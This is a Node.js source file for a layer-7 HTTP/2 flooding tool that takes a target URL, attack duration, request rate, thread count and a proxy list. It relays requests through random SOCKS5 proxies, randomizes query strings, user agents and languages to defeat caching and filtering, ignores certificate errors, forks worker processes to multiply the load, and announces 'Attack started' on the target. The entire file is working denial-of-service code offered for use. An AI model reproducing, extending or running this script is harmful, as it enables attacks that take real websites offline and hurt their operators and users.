const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`node socks.js target time rate thread proxyfile`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
];

const languages = ['es-ES,es;q=0.9', 'en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9'];

function buildHeaders() {
    return {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + "?" + randomString(5) + "=" + randomString(10),
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br, zstd",
        "cache-control": "no-cache",
        "upgrade-insecure-requests": "1",
    };
}

function R_U_Gothbreach() {
    const proxyAddr = randomElement(proxies).split(':');
    if (!proxyAddr[0] || !proxyAddr[1]) return;

    const agent = new SocksClient({
        proxy: {
            host: proxyAddr[0],
            port: parseInt(proxyAddr[1]),
            type: 5
        },
        command: 'connect',
        destination: {
            host: parsedTarget.host,
            port: 443
        }
    });

    agent.establish((err, socksDetails) => {
        if (err) return;

        const connection = socksDetails.socket;

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384",
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.on('error', () => {
            tlsConn.destroy();
            connection.destroy();
        });

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            createConnection: () => tlsConn,
            settings: {
                maxConcurrentStreams: 1,
                initialWindowSize: 65535,
                enablePush: false,
            }
        });

        client.on("connect", () => {
            const headers = buildHeaders();
            const request = client.request(headers);

            request.on("end", () => {
                request.destroy();
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            });

            request.on("error", () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            });

            request.end();
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

if (cluster.isPrimary) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    console.log(`Attack started on ${args.target} for ${args.time} seconds`);
    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);
} else {
    setInterval(R_U_Gothbreach, 1000 / args.Rate);
               }
